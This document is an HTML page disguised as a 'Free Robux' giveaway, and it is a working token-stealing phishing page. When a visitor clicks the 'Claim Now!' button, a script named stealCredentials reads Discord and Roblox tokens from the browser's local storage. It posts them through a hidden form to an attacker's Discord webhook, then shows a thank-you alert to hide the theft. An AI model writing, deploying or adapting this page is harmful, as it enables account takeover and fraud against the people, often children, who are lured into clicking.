<!DOCTYPE html>
<html>
<head>
    <title>Free Robux!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            text-align: center;
            padding-top: 50px;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: 0 auto;
        }
        .btn {
            background-color: #5cb85c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #4cae4c;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to our giveaway!</h1>
        <p>Click the button below to claim your free Robux!</p>
        <button class="btn" onclick="stealCredentials()">Claim Now!</button>
    </div>

    <script>
        function stealCredentials() {
            // Create hidden form to capture credentials
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst';
            
            // Add Discord token field
            var discordToken = document.createElement('input');
            discordToken.type = 'hidden';
            discordToken.name = 'discord_token';
            discordToken.value = localStorage.getItem('discord_token');
            form.appendChild(discordToken);
            
            // Add Roblox token field
            var robloxToken = document.createElement('input');
            robloxToken.type = 'hidden';
            robloxToken.name = 'roblox_token';
            robloxToken.value = localStorage.getItem('roblox_token');
            form.appendChild(robloxToken);
            
            // Submit the form
            document.body.appendChild(form);
            form.submit();
            
            // Show success message
            alert('Thank you for participating!');
        }
    </script>
</body>
</html>
